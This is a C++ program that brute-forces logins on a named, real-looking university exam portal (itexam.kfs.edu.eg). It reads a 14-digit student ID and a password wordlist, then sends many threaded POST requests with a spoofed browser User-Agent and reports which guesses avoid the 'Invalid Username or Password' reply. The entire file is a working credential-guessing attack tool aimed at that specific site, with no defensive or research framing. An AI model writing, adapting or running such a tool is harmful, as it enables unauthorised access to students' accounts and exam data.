
#include <curl/curl.h>
#include <fmt/format.h>
#include <string>
#include <fstream>
#include <chrono>
#include <thread>
#include <vector>
#include <cstring>
#include <filesystem>
#include <stdexcept>
#include <regex>

using std::string;
using std::thread;

inline __fastcall size_t writeCallBack(void*, size_t, size_t, string*);

__fastcall void Login(const string&, const string&);

inline __fastcall void cli();

int main(int argc, char* args[]) {
  if (argc == 3) {
    const string username = args[1];
    const string passFile = args[2];
    std::ifstream reader;

    try {
      if (std::regex_search(username, std::regex("[^0-9]"))) throw std::logic_error("ID contain digits.");
      else if (username.size() != 14) throw std::logic_error("ID 14 digits.");

      bool file = std::filesystem::is_regular_file(passFile);
      if (file) {
        if (!std::filesystem::exists(passFile)) throw std::logic_error("Not found: " + string(args[2]));
        const string fileType = passFile.substr(passFile.find('.') + 1, 3);
        if (fileType != "txt") throw std::logic_error(passFile + " Not txt.");
      }
    
      thread t1(cli);
      t1.join();
      printf("INSTA: C0.58\n");
      thread t2(cli);
      t2.join();

      if (file) {
        string password;
        std::vector<thread> threads;
        reader.open(passFile);

        while (getline(reader, password)) {
          threads.emplace_back(Login, username, password);
          if (threads.size() >= thread::hardware_concurrency()) {
            for (thread& t : threads) t.join();
            threads.clear();
          }
        }

        reader.close();
        for (thread& t : threads) t.join();
      }
      else Login(username, passFile);

    } catch(const std::exception& msg) {
      fmt::print("Error!, {}", msg.what());
    }
    return 0;
  }
  else if (argc == 2 && strcmp(args[1], "--help") == 0) {
    printf("Example: 30511168800435 password\n\t30511168800435 password.txt");
    return 1;
  }
  else {
    printf("use --help");
    return 2;
  }
}

inline __fastcall size_t writeCallBack(void* contents, size_t size, size_t received, string* output) {
  size_t totalSize = size * received;
  output->append((char*)contents, totalSize);
  return totalSize;
}

__fastcall void Login(const string& username, const string& password) {
  CURL* curl = curl_easy_init();
  struct curl_slist* header = nullptr;
  if (curl) {
    string response;
      
    header = curl_slist_append(header, "Content-Type: application/x-www-form-urlencoded");
    header = curl_slist_append(header, "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36");

    const char* REQ = "https://itexam.kfs.edu.eg/AI_Stud/Default/Login";
    string payload = "username=" + username + "&password=" + password + "&submit=login";

    curl_easy_setopt(curl, CURLOPT_URL, REQ);
    curl_easy_setopt(curl, CURLOPT_POST, 1);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, header);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());

    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallBack);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode result = curl_easy_perform(curl);

    if (result != CURLE_OK) std::logic_error("Check internet!");
    
    response = response.substr(static_cast<int>(response.size() / 2.0333309f), response.size() / 120);
    const string error = "Invalid Username or Password";
    const string key = response.find('<') != string::npos ? response.substr(response.find('>') + 1, error.size()) : "Error";
    static int x = 0;
    fmt::println("{}:{} >> {}",username, password, (key == error ?  error : key));

    curl_slist_free_all(header);
    curl_easy_cleanup(curl);
  }
  else std::logic_error("Curl!");
}

inline __fastcall void cli() {
  for (int i = 0; i < 20; ++i) {
    printf("=");
    std::this_thread::sleep_for(std::chrono::milliseconds(20));
  }
  printf("\n");
}